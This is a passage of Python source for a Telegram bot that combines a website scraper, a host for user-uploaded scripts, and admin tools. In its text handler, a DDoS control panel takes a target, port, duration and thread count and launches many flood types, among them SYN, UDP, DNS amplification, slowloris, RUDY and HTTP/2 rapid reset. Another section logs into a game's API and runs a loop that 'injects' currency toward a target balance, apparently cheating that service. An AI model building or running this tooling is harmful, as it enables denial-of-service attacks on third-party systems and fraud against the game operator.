        await safe_edit(query, card("SCRAPER HELP",
            f"  Build: {BOT_VERSION}\n"
            "  1. Save URL → one page (depth 0)\n"
            "  2. Full site crawl → follows same-domain links\n"
            "  3. Batch → many start URLs\n"
            "  4. Settings → depth / assets / mode\n"
            f"  Cap: {SCRAPER_MAX_PAGES} pages · zip ≤{SCRAPER_MAX_ZIP_MB}MB\n\n"
            f"  {_sc_engine_status()}"), scraper_menu())
        return
    if data.startswith("scset:"):
        key = data.split(":", 1)[1]
        s = scraper_settings[user_id]
        if key == "depth":
            steps = SCRAPER_DEPTH_STEPS
            try:
                i = steps.index(s.get("depth", 0))
            except ValueError:
                i = 0
            s["depth"] = steps[(i + 1) % len(steps)]
        elif key == "assets":
            opts = [50, 100, 200, 400, 800, 0]
            try:
                i = opts.index(s["max_assets"])
            except ValueError:
                i = 0
            s["max_assets"] = opts[(i + 1) % len(opts)]
        elif key == "images":
            s["images"] = not s["images"]
        elif key == "jscss":
            s["js_css"] = not s["js_css"]
        elif key == "fonts":
            s["fonts"] = not s["fonts"]
        elif key == "mode":
            order = ["zip", "md", "txt", "both"]
            s["mode"] = order[(order.index(s["mode"]) + 1) % len(order)] if s["mode"] in order else "zip"
        elif key == "rewrite":
            s["rewrite"] = not s["rewrite"]
        elif key == "mobile":
            s["mobile"] = not s["mobile"]
        elif key == "shot":
            s["screenshot"] = not s["screenshot"]
        elif key == "selector":
            waiting_for[user_id] = "sc_selector"
            await safe_edit(query, card("SELECTOR", "  Send CSS selector\n  e.g. article or main"), back_only())
            return
        elif key == "selclear":
            s["selector"] = ""
        elif key == "reset":
            scraper_settings[user_id] = _scraper_default_settings()
            s = scraper_settings[user_id]
        body = (
            f"  Depth    : {s['depth']}\n"
            f"  Assets   : {s['max_assets'] or '∞'}\n"
            f"  Images   : {s['images']} · JS/CSS: {s['js_css']} · Fonts: {s['fonts']}\n"
            f"  Mode     : {s['mode']} · Rewrite: {s['rewrite']}\n"
            f"  Mobile   : {s['mobile']} · Shot: {s['screenshot']}\n"
            f"  Selector : {s['selector'] or '-'}"
        )
        await safe_edit(query, card("SCRAPER SETTINGS", body), scraper_settings_kb(user_id))
        return
    if data.startswith("schist:"):
        idx = int(data.split(":")[1])
        hist = list(scraper_history[user_id])
        if 0 <= idx < len(hist):
            await query.answer("Re-run")
            await scraper_start_job(context.bot, user_id, hist[idx]["url"])
        else:
            await query.answer("Gone", show_alert=True)
        return
    if data.startswith("sccancel:"):
        scraper_cancel.add(user_id)
        await query.answer("Cancelling")
        return
    if data.startswith(("scmd:", "sctxt:", "sczip:", "scshot:")):
        action, job_id = data.split(":", 1)
        action = action.replace("sc", "")  # md/txt/zip/shot - wait scmd -> need careful
        # data is scmd:jobid
        pure = data.split(":", 1)[0]  # scmd
        act = pure[2:] if pure.startswith("sc") else pure  # md / txt / zip / shot / cancel already handled
        with scraper_lock:
            job = scraper_jobs.get(user_id)
        if not job or job.get("job_id") != job_id:
            await query.answer("Job expired", show_alert=True)
            return
        result = job.get("result")
        if not result:
            await query.answer("Still running")
            return
        await query.answer()
        try:
            if pure == "scmd" and result.get("md") and os.path.isfile(result["md"]):
                with open(result["md"], "rb") as f:
                    await context.bot.send_document(chat_id=user_id, document=f, caption="Markdown")
            elif pure == "sctxt" and result.get("txt") and os.path.isfile(result["txt"]):
                with open(result["txt"], "rb") as f:
                    await context.bot.send_document(chat_id=user_id, document=f, caption="Text")
            elif pure == "sczip" and result.get("zip") and os.path.isfile(result["zip"]):
                with open(result["zip"], "rb") as f:
                    await context.bot.send_document(chat_id=user_id, document=f, caption="Zip")
            elif pure == "scshot":
                shot = result.get("shot")
                if shot and os.path.isfile(shot):
                    with open(shot, "rb") as f:
                        await context.bot.send_photo(chat_id=user_id, photo=f, caption=result.get("final_url", ""))
                else:
                    await context.bot.send_message(chat_id=user_id, text="No screenshot available")
        except Exception as e:
            await context.bot.send_message(chat_id=user_id, text=f"Send failed: {str(e)[:80]}")
        return


    if data == "login":
        waiting_for[user_id] = "login"
        await safe_edit(query, card("AUTH", "  Send credentials:\n  username password\n\n  Example:\n  legacy_dev mypass"), back_only())
        return

    if data == "set_amount":
        if user_id not in user_sessions:
            await safe_edit(query, card("ERROR", "  Login required first"), main_menu(user_id))
            return
        await safe_edit(query, card("PAYLOAD", "  Select injection amount"), amount_menu())
        return

    if data.startswith("amt_"):
        if user_id not in user_sessions:
            await safe_edit(query, card("ERROR", "  Login required"), main_menu(user_id))
            return
        if data == "amt_custom":
            waiting_for[user_id] = "amount"
            await safe_edit(query, card("CUSTOM", "  Send amount number\n  Example: 250000"), back_only())
            return
        amount = int(data.split("_")[1])
        user_sessions[user_id]["amount"] = amount
        await safe_edit(query, card("SET", f"  Payload locked\n  ₦{amount:,} / cycle"), main_menu(user_id))
        return

    if data == "set_target":
        if user_id not in user_sessions:
            await safe_edit(query, card("ERROR", "  Login required first"), main_menu(user_id))
            return
        waiting_for[user_id] = "target"
        await safe_edit(query, card("TARGET", "  Send target balance\n  Example: 50000000\n\n  Send 0 to disable"), back_only())
        return

    if data == "run":
        if user_id not in user_sessions:
            await safe_edit(query, card("ERROR", "  Login required first"), main_menu(user_id))
            return
        if user_sessions[user_id].get("running"):
            await safe_edit(query, card("INFO", "  Process already active"), main_menu(user_id))
            return
        amount = user_sessions[user_id].get("amount", 50000)
        target = user_sessions[user_id].get("target", 0)
        if chat_id != user_id:
            await safe_edit(query, card("INJECT", "  Launching...\n  Live feed → your DM"), main_menu(user_id))
        else:
            await safe_edit(query, card("INJECT", "  Launching..."), main_menu(user_id))
        try:
            await play_hack_animation(context.bot, user_id)
        except:
            pass
        try:
            msg = await context.bot.send_message(chat_id=user_id, text=live_status(0, 0, 0, amount, 0, target, extra="Initializing..."))
            status_chat_id = user_id
            status_msg_id = msg.message_id
        except Exception:
            await context.bot.send_message(chat_id=chat_id, text=card("ERROR", "  Open private chat with bot\n  and press /start first"))
            return
        user_sessions[user_id]["status_chat_id"] = status_chat_id
        user_sessions[user_id]["status_msg_id"] = status_msg_id
        user_sessions[user_id]["running"] = True
        t = threading.Thread(target=progression_loop, args=(user_id, status_chat_id, status_msg_id), daemon=True)
        user_sessions[user_id]["thread"] = t
        t.start()
        return

    if data == "stop":
        if user_id not in user_sessions or not user_sessions[user_id].get("running"):
            await safe_edit(query, card("INFO", "  No active process"), main_menu(user_id))
            return
        user_sessions[user_id]["running"] = False
        await safe_edit(query, card("KILL", "  Stopping current cycle..."), main_menu(user_id))
        return

    if data == "status":
        if user_id not in user_sessions:
            await safe_edit(query, card("ERROR", "  Login required first"), main_menu(user_id))
            return
        save = read_save(user_sessions[user_id]["session"])
        if not save or "game" not in save:
            await safe_edit(query, card("ERROR", "  Could not read save"), main_menu(user_id))
            return
        bal = save["game"].get("money", 0)
        amount = user_sessions[user_id].get("amount", 50000)
        target = user_sessions[user_id].get("target", 0)
        status_txt = "● ACTIVE" if user_sessions[user_id].get("running") else "○ IDLE"
        body = (
            f"  User    : {user_sessions[user_id]['username']}\n"
            f"  Payload : ₦{amount:,}\n"
            f"  Balance : ₦{bal:,}\n"
            f"  State   : {status_txt}"
        )
        if target > 0:
            body += f"\n  Target  : ₦{target:,}"
        await safe_edit(query, card("STATUS", body), main_menu(user_id))
        return

    if data == "help":
        await safe_edit(query, card("HELP",
            "  1. LOGIN with account\n"
            "  2. SET AMOUNT\n"
            "  3. Optional TARGET\n"
            "  4. INJECT to start\n\n"
            "  MY BOTS → manage hosted scripts\n"
            "  NEW BOT → upload .py / .js\n"
            "  Full control panel like panel bots."), main_menu(user_id))
        return

    if data == "support":
        waiting_for[user_id] = "support"
        await safe_edit(query, card("SUPPORT", "  Send your message now."), back_only())
        return

    if not is_admin(user_id):
        return

    if data == "admin":
        running = sum(1 for s in user_sessions.values() if s.get("running"))
        await safe_edit(query,
            f"{banner('ADMIN')}\n\n"
            f"  Total users : {len(all_users)}\n"
            f"  Logged in   : {len(user_sessions)}\n"
            f"  Active      : {running}\n"
            f"  Hosted bots : {len(hosted_bots)}",
            admin_panel())
        return

    if data == "sessions":
        if not user_sessions:
            await safe_edit(query, card("SESSIONS", "  No active sessions"), admin_panel())
            return
        lines = [f"  • {s.get('username','?')} | {'●' if s.get('running') else '○'} | ₦{s.get('amount',0):,}" for s in user_sessions.values()]
        await safe_edit(query, card("SESSIONS", "\n".join(lines)), admin_panel())
        return

    if data == "users":
        running = sum(1 for s in user_sessions.values() if s.get("running"))
        await safe_edit(query, card("USERS", f"  Unique  : {len(all_users)}\n  Logged  : {len(user_sessions)}\n  Active  : {running}"), admin_panel())
        return

    if data == "stop_user":
        waiting_for[user_id] = "stop_user"
        await safe_edit(query, card("STOP USER", "  Send username to kill"), back_only())
        return

    if data == "broadcast":
        waiting_for[user_id] = "broadcast"
        await safe_edit(query, card("BROADCAST", "  Send message (text or media)"), back_only())
        return

    if data == "set_pic":
        waiting_for[user_id] = "set_pic"
        await safe_edit(query, card("WELCOME PIC", "  Send the new photo now"), back_only())
        return

    if data == "update_bot":
        waiting_for[user_id] = "update_bot"
        await safe_edit(query, card("UPDATE", "  Send new .py file"), back_only())
        return

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    text = update.message.text.strip() if update.message.text else ""

    if user_id not in waiting_for:
        track_user(user_id)
        if welcome_pic_id:
            try:
                await update.message.reply_photo(photo=welcome_pic_id, caption=welcome_caption(), reply_markup=main_menu(user_id))
                return
            except:
                pass
        await update.message.reply_text(welcome_caption(), reply_markup=main_menu(user_id))
        return

    state = waiting_for[user_id]

    # Env var
    if state.startswith("env_"):
        bot_id = state.replace("env_", "")
        b = hosted_bots.get(bot_id)
        if not b:
            del waiting_for[user_id]
            return
        if "=" in text:
            k, v = text.split("=", 1)
            b.setdefault("env", {})[k.strip()] = v.strip()
            save_hosts()
            await update.message.reply_text(card("ENV SET", f"  {k.strip()} = {v.strip()}"), reply_markup=bot_control_panel(bot_id))
        else:
            await update.message.reply_text(card("ERROR", "  Format: KEY=VALUE"), reply_markup=back_only())
        del waiting_for[user_id]
        return

    # Install package
    if state.startswith("pkg_"):
        bot_id = state.replace("pkg_", "")
        b = hosted_bots.get(bot_id)
        if not b:
            del waiting_for[user_id]
            return
        pkg = text.strip()
        await update.message.reply_text(card("INSTALL", f"  Installing {pkg}..."))
        try:
            r = subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--no-cache-dir"], capture_output=True, text=True, timeout=90)
            if r.returncode == 0:
                await update.message.reply_text(card("OK", f"  {pkg} installed"), reply_markup=bot_control_panel(bot_id))
            else:
                await update.message.reply_text(card("FAIL", r.stderr[-200:] or "failed"), reply_markup=bot_control_panel(bot_id))
        except Exception as e:
            await update.message.reply_text(card("ERROR", str(e)[:60]), reply_markup=bot_control_panel(bot_id))
        del waiting_for[user_id]
        return

    # Set token
    if state.startswith("token_"):
        bot_id = state.replace("token_", "")
        b = hosted_bots.get(bot_id)
        if not b:
            del waiting_for[user_id]
            return
        b["token"] = text.strip()
        save_hosts()
        del waiting_for[user_id]
        await update.message.reply_text(card("TOKEN SET", "  Token saved.\n  Restart bot to apply."), reply_markup=bot_control_panel(bot_id))
        return

    
    if state == "sc_save":
        urls = _sc_extract_urls(text)
        if user_id in waiting_for:
            del waiting_for[user_id]
        if not urls:
            # fallback: treat whole message as URL if it looks like one
            t = text.strip()
            if t.startswith("http://") or t.startswith("https://"):
                urls = [t.split()[0]]
        if not urls:
            await update.message.reply_text(card("ERROR", "  No URL found"), reply_markup=scraper_menu())
            return
        try:
            await update.message.reply_text(
                card("SCRAPER", f"  Got URL\n  {urls[0][:80]}\n  Starting..."),
            )
            await scraper_start_job(context.bot, user_id, urls[0])
        except Exception as e:
            await update.message.reply_text(
                card("ERROR", f"  Start failed: {str(e)[:120]}"),
                reply_markup=scraper_menu(),
            )
        return

    if state == "sc_batch":
        urls = _sc_extract_urls(text)
        if user_id in waiting_for:
            del waiting_for[user_id]
        if not urls:
            await update.message.reply_text(card("ERROR", "  No URLs found"), reply_markup=scraper_menu())
            return
        await update.message.reply_text(card("BATCH", f"  Starting {len(urls)} URL(s)"))
        for u in urls[:20]:
            try:
                await scraper_start_job(context.bot, user_id, u)
            except Exception as e:
                await update.message.reply_text(card("ERROR", f"  {u[:40]} → {str(e)[:60]}"))
            await asyncio.sleep(0.35)
        return

    if state == "sc_selector":
        scraper_settings[user_id]["selector"] = text.strip()
        del waiting_for[user_id]
        await update.message.reply_text(
            card("SELECTOR SET", f"  {text.strip()[:80]}"),
            reply_markup=scraper_menu(),
        )
        return


    if state == "dd_ping":
        del waiting_for[user_id]
        await update.message.reply_text(f"🔍 Pinging `{text}`...", parse_mode="Markdown")
        def do_ping():
            host, res = ddos_engine.check_target_status(text)
            report = f"📊 *Ping: {host}*\n"
            if 'http_status' in res:
                report += f"• HTTP: `{res['http_status']}` · `{res.get('latency_ms','?')} ms`\n"
            if 'http_error' in res:
                report += f"• HTTP Error: `{res['http_error']}`\n"
            if 'ping_success' in res:
                icon = "🟢 Online" if res['ping_success'] else "🔴 Offline"
                report += f"• ICMP: {icon} (`{res.get('ping_latency_ms','?')} ms`)"
            bot_sync(context.bot.send_message(chat_id=chat_id, text=report, parse_mode="Markdown"))
        threading.Thread(target=do_ping, daemon=True).start()
        return

    if state == "dd_input":
        st = ddos_user_state.get(user_id, {})
        if not st:
            del waiting_for[user_id]
            return
        vcode = st["vector"]
        vname = st["vname"]
        needs_port = vcode not in ("http", "ws", "post", "icmp", "rudy", "h2reset")
        step = st.get("step", "target")

        if step == "target":
            st["target"] = text.strip()
            st["step"] = "port" if needs_port else "dur"
            if needs_port:
                await update.message.reply_text(card(vname, "  Send port number\n  Example: 80"), reply_markup=back_only())
            else:
                await update.message.reply_text(card(vname, "  Send duration (seconds)\n  Example: 30"), reply_markup=back_only())
            return

        if step == "port":
            try:
                st["port"] = int(text.strip())
            except ValueError:
                await update.message.reply_text(card("ERROR", "  Invalid port"), reply_markup=back_only())
                return
            st["step"] = "dur"
            await update.message.reply_text(card(vname, "  Send duration (seconds)\n  Example: 30"), reply_markup=back_only())
            return

        if step == "dur":
            try:
                st["dur"] = int(text.strip())
            except ValueError:
                await update.message.reply_text(card("ERROR", "  Invalid duration"), reply_markup=back_only())
                return
            st["step"] = "threads"
            await update.message.reply_text(card(vname, "  Send thread count\n  Example: 10"), reply_markup=back_only())
            return

        if step == "threads":
            try:
                st["threads"] = int(text.strip())
            except ValueError:
                await update.message.reply_text(card("ERROR", "  Invalid thread count"), reply_markup=back_only())
                return

            del waiting_for[user_id]
            target = st["target"]
            port = st.get("port", 80)
            dur = st["dur"]
            threads_n = st["threads"]
            ddos_engine.current_target = target
            ddos_engine.stats = {k: 0 for k in ddos_engine.stats}

            await update.message.reply_text(
                card("LAUNCHED", f"  Vector   : {vname}\n  Target   : {target}\n  Duration : {dur}s\n  Threads  : {threads_n}"),
                reply_markup=ddos_menu()
            )

            def launch():
                url = target if target.startswith("http") else f"http://{target}"
                if vcode == "http":
                    ddos_engine.vector_http_flood(url, dur, threads_n)
                elif vcode == "syn":
                    ddos_engine.vector_syn_flood(target, port, dur, threads_n)
                elif vcode == "udp":
                    ddos_engine.vector_udp_flood(target, port, dur, threads_n)
                elif vcode == "tcp":
                    ddos_engine.vector_tcp_flood(target, port, dur, threads_n)
                elif vcode == "dns":
                    ddos_engine.vector_dns_amplification(target, port, dur, threads_n)
                elif vcode == "icmp":
                    ddos_engine.vector_icmp_flood(target, dur, threads_n)
                elif vcode == "slow":
                    ddos_engine.vector_slowloris(target, port, dur, threads_n)
                elif vcode == "ws":
                    ddos_engine.vector_websocket_flood(url, dur, threads_n)
                elif vcode == "ssl":
                    ddos_engine.vector_ssl_flood(target, port, dur, threads_n)
                elif vcode == "post":
                    ddos_engine.vector_slow_post(url, dur, threads_n)
                elif vcode == "rudy":
                    ddos_engine.vector_rudy(url, dur, threads_n)
                elif vcode == "h2reset":
                    ddos_engine.vector_http2_rapid_reset(url, dur, threads_n)
                elif vcode == "multi":
                    ddos_engine.vector_multivector(target, port, dur, threads_n)

            threading.Thread(target=launch, daemon=True).start()
            return

    if state == "login":
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await update.message.reply_text(card("ERROR", "  Format: username password"), reply_markup=back_only())
            return
        username, password = parts[0], parts[1]
        session = make_session()
        login_res = raw(session, "/api/auth/login", "POST", {"username": username, "password": password})
        if login_res["status"] != 200:
            await update.message.reply_text(card("AUTH FAILED", f"  Status {login_res['status']}"), reply_markup=back_only())
            del waiting_for[user_id]
            return
        user_sessions[user_id] = {
            "session": session, "username": username, "running": False,
            "thread": None, "status_chat_id": None, "status_msg_id": None,
            "amount": 50000, "target": 0
        }
        track_user(user_id)
        del waiting_for[user_id]
        await update.message.reply_text(card("ACCESS GRANTED", f"  User    : {username}\n  Default : ₦50,000"), reply_markup=main_menu(user_id))
        return

    if state == "amount":
        try:
            amount = int(text.replace(",", "").replace("₦", ""))
            if amount < 1000:
                await update.message.reply_text(card("ERROR", "  Minimum 1000"), reply_markup=back_only())
                return
        except:
            await update.message.reply_text(card("ERROR", "  Invalid number"), reply_markup=back_only())
            return
        if user_id not in user_sessions:
            await update.message.reply_text(card("ERROR", "  Login first"), reply_markup=main_menu(user_id))
            del waiting_for[user_id]
            return
        user_sessions[user_id]["amount"] = amount
        del waiting_for[user_id]
        await update.message.reply_text(card("SET", f"  Payload : ₦{amount:,}"), reply_markup=main_menu(user_id))
        return

    if state == "target":
        try:
            target = int(text.replace(",", "").replace("₦", ""))
            if target < 0:
                target = 0
        except:
            await update.message.reply_text(card("ERROR", "  Invalid number"), reply_markup=back_only())
            return
        if user_id not in user_sessions:
            await update.message.reply_text(card("ERROR", "  Login first"), reply_markup=main_menu(user_id))
            del waiting_for[user_id]
            return
        user_sessions[user_id]["target"] = target
        del waiting_for[user_id]
        msg = f"  Target : ₦{target:,}" if target > 0 else "  Target disabled"
        await update.message.reply_text(card("TARGET SET", msg), reply_markup=main_menu(user_id))
        return

    if state == "support":
        uname = update.effective_user.username or "no_username"
        full_name = update.effective_user.full_name or "Unknown"
        session_name = user_sessions.get(user_id, {}).get("username", "not logged in")
        alert = (
            f"🆘 SUPPORT TICKET\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Name     : {full_name}\n"
            f"Username : @{uname}\n"
            f"User ID  : {user_id}\n"
            f"Game user: {session_name}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Message:\n{text}"
        )
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(chat_id=admin_id, text=alert)
            except:
                pass
        del waiting_for[user_id]
        await update.message.reply_text(card("SUPPORT", "  Message sent to admin."), reply_markup=main_menu(user_id))
        return

    if state == "stop_user" and is_admin(user_id):
        target = text.strip().lower()
        found = False
        for uid, s in list(user_sessions.items()):
            if s.get("username", "").lower() == target:
                s["running"] = False
                found = True
                await update.message.reply_text(card("KILLED", f"  Stopped {s['username']}"), reply_markup=admin_panel())
                break
        if not found:
            await update.message.reply_text(card("NOT FOUND", f"  No session for '{text}'"), reply_markup=admin_panel())
        del waiting_for[user_id]
        return

    if state == "broadcast" and is_admin(user_id):
        load_users()
        targets = list(all_users)
        if not targets:
            del waiting_for[user_id]
            await update.message.reply_text(card("DONE", "  No users saved yet"), reply_markup=admin_panel())
            return
        await update.message.reply_text(card("BROADCAST", f"  Sending to {len(targets)} users..."))
        success = fail = 0
        for uid in targets:
            try:
                await context.bot.copy_message(chat_id=uid, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
                success += 1
                await asyncio.sleep(0.05)
            except:
                fail += 1
        del waiting_for[user_id]
        await update.message.reply_text(card("DONE", f"  Total  : {len(targets)}\n  Sent   : {success}\n  Failed : {fail}"), reply_markup=admin_panel())
        return

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    user_tag = f"{user.first_name} (@{user.username})" if user.username else user.first_name

    # New bot upload
    if user_id in waiting_for and waiting_for[user_id] == "new_bot":
        doc = update.message.document
        if not doc:
            await update.message.reply_text(card("ERROR", "  Send a file"), reply_markup=back_only())
            return
        file_name = doc.file_name or "main.py"
        if not (file_name.endswith(".py") or file_name.endswith(".js")):
            await update.message.reply_text(card("ERROR", "  Only .py and .js allowed"), reply_markup=back_only())
            return
        del waiting_for[user_id]

        if is_admin(user_id):
            await update.message.reply_text(card("OWNER", "  Creating bot..."))
            asyncio.create_task(create_hosted_bot(context, user_id, doc.file_id, file_name, "Owner"))
            return

        task_id = str(uuid.uuid4())[:8]
        pending_files[task_id] = {
            "user_id": user_id,
            "file_id": doc.file_id,
            "file_name": file_name,
            "user_info": user_tag
        }
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ APPROVE", callback_data=f"appr_{task_id}"),
            InlineKeyboardButton("❌ REJECT", callback_data=f"rejc_{task_id}")
        ]])
        try:
            await context.bot.send_document(
                chat_id=ADMIN_IDS[0],
                document=doc.file_id,
                caption=f"📥 NEW BOT REQUEST\n\nFrom: {user_tag}\nID: `{user_id}`\nFile: `{file_name}`",
                parse_mode="Markdown",
                reply_markup=kb
            )
            await update.message.reply_text(card("PENDING", "  Sent to owner for approval."))
        except Exception as e:
            await update.message.reply_text(card("ERROR", f"  {str(e)[:40]}"))
        return

    # Update files for existing hosted bot (prefix bupdate_ — not update_bot core)
    if user_id in waiting_for and waiting_for[user_id].startswith("bupdate_"):
        bot_id = waiting_for[user_id].replace("bupdate_", "")
        b = hosted_bots.get(bot_id)
        if not b or (b["owner_id"] != user_id and not is_admin(user_id)):
            del waiting_for[user_id]
            return
        doc = update.message.document
        if not doc:
            await update.message.reply_text(card("ERROR", "  Send a file"), reply_markup=back_only())
            return
        file_name = doc.file_name or b["main_file"]
        try:
            new_file = await context.bot.get_file(doc.file_id)
            dest = os.path.join(b["path"], file_name)
            await new_file.download_to_drive(dest)
            if file_name.endswith(".py") or file_name.endswith(".js"):
                b["main_file"] = file_name
                b["kind"] = "python" if file_name.endswith(".py") else "javascript"
            save_hosts()
            del waiting_for[user_id]
            await update.message.reply_text(card("UPDATED", f"  {file_name} saved.\n  Restart to apply."), reply_markup=bot_control_panel(bot_id))
        except Exception as e:
            await update.message.reply_text(card("ERROR", str(e)[:50]), reply_markup=bot_control_panel(bot_id))
        return

    if not is_admin(user_id):
        return

    if user_id in waiting_for and waiting_for[user_id] == "set_pic":
        if update.message.photo:
            file_id = update.message.photo[-1].file_id
            save_welcome_pic(file_id)
            del waiting_for[user_id]
            await update.message.reply_text(card("PIC SET", "  Welcome image updated"), reply_markup=admin_panel())
            return
        else:
            await update.message.reply_text(card("ERROR", "  Send a photo"), reply_markup=back_only())
            return

    if user_id in waiting_for and waiting_for[user_id] == "update_bot":
        doc = update.message.document
        if not doc:
            await update.message.reply_text(card("ERROR", "  Send a .py file"), reply_markup=back_only())
            return
        fname = (doc.file_name or "").lower()
        if not fname.endswith(".py"):
            await update.message.reply_text(card("ERROR", "  Send a .py file only"), reply_markup=back_only())
            return

        status_msg = await update.message.reply_text(card("UPDATE", "  Downloading new core..."))
        try:
            # Download with timeout so it never hangs forever
            tg_file = await asyncio.wait_for(context.bot.get_file(doc.file_id), timeout=30)
            new_code = await asyncio.wait_for(tg_file.download_as_bytearray(), timeout=90)
        except asyncio.TimeoutError:
            await status_msg.edit_text(card("ERROR", "  Download timed out. Try again."))
            return
        except Exception as e:
            await status_msg.edit_text(card("ERROR", f"  Download failed: {str(e)[:60]}"))
            return

        if len(new_code) < 500:
            await status_msg.edit_text(card("ERROR", "  File too small / empty"))
            return

        try:
            # Resolve real paths that might be the running entrypoint
            write_targets = []
            for candidate in [
                BOT_FILE,
                os.path.abspath(__file__),
                os.path.join(os.getcwd(), "tt.py"),
                os.path.join(os.getcwd(), "main.py"),
                os.path.join(os.getcwd(), "bot.py"),
                os.path.join(os.getcwd(), "app.py"),
                os.path.join(os.getcwd(), "lagoslife_bot_scraper_fixed.py"),
            ]:
                if candidate and candidate not in write_targets:
                    write_targets.append(candidate)

            written = []
            for path in write_targets:
                try:
                    parent = os.path.dirname(path) or "."
                    if not os.path.isdir(parent):
                        continue
                    # backup only if file already exists
                    if os.path.exists(path):
                        try:
                            shutil.copy2(path, path + ".bak")
                        except Exception:
                            pass
                    with open(path, "wb") as f:
                        f.write(new_code)
                    # verify write
                    with open(path, "rb") as f:
                        check = f.read(2000)
                    if len(check) < 500:
                        continue
                    written.append(path)
                except Exception:
                    continue

            if not written:
                await status_msg.edit_text(card("ERROR", "  Write failed on all paths"))
                return

            # Detect version marker in new code (if present)
            ver = "unknown"
            try:
                text = new_code.decode("utf-8", errors="ignore")
                for line in text.splitlines():
                    if "BOT_VERSION" in line and "=" in line:
                        ver = line.split("=", 1)[1].strip().strip("\"'")
                        break
                has_full = "sc_full" in text and "Full site crawl" in text
            except Exception:
                has_full = False

            if user_id in waiting_for:
                del waiting_for[user_id]

            paths_short = "\n".join(f"  · {os.path.basename(p)}" for p in written[:5])
            await status_msg.edit_text(
                card(
                    "SUCCESS",
                    f"  Core updated ({len(new_code)} bytes)\n"
                    f"  Version : {ver}\n"
                    f"  FullCrawl: {'YES' if has_full else 'NO'}\n"
                    f"  Wrote:\n{paths_short}\n"
                    f"  Restarting in 2s...",
                )
            )
            await asyncio.sleep(2)

            # Prefer in-place re-exec of the file we just wrote
            run_path = written[0]
            try:
                os.execv(sys.executable, [sys.executable, run_path] + sys.argv[1:])
            except Exception:
                pass
            try:
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except Exception:
                pass
            os._exit(0)
        except Exception as e:
            await status_msg.edit_text(card("ERROR", f"  Write failed: {str(e)[:60]}"))
            return

    if user_id in waiting_for and waiting_for[user_id] == "broadcast":
        load_users()
        targets = list(all_users)
        success = fail = 0
        for uid in targets:
            try:
                await context.bot.copy_message(chat_id=uid, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
                success += 1
                await asyncio.sleep(0.05)
            except:
                fail += 1
        del waiting_for[user_id]
        await update.message.reply_text(card("DONE", f"  Total  : {len(targets)}\n  Sent   : {success}\n  Failed : {fail}"), reply_markup=admin_panel())
        return

class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        mode = "Web Service" if IS_WEB_SERVICE else "Worker"
        self.wfile.write(f"LagosLife Core + Bot Host Online ({mode})\n".encode())
    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass

def start_http_server():
    if not PORT:
        return
    try:
        server = HTTPServer(("0.0.0.0", PORT), DummyHandler)
        print(f"[*] HTTP health server on port {PORT} (Render Web Service mode)")
        server.serve_forever()
    except Exception as e:
        print(f"[!] HTTP server failed: {e}")

async def post_init(app):
    global app_instance, main_loop
    app_instance = app
    main_loop = asyncio.get_running_loop()
    asyncio.create_task(edit_worker(app))

def main():
    # Web Service → start health server so Render keeps the process alive
    # Background Worker / VPS → no PORT, just run the bot
    if IS_WEB_SERVICE:
        threading.Thread(target=start_http_server, daemon=True).start()
        print("[*] Mode: Render Web Service (PORT detected)")
    else:
        print("[*] Mode: Background Worker / VPS (no PORT)")

    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    app = Application.builder().token(TELEGRAM_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("leave", leave_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO | filters.VIDEO, document_handler))

    print("[*] LagosLife + Professional Bot Control Panel ready")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
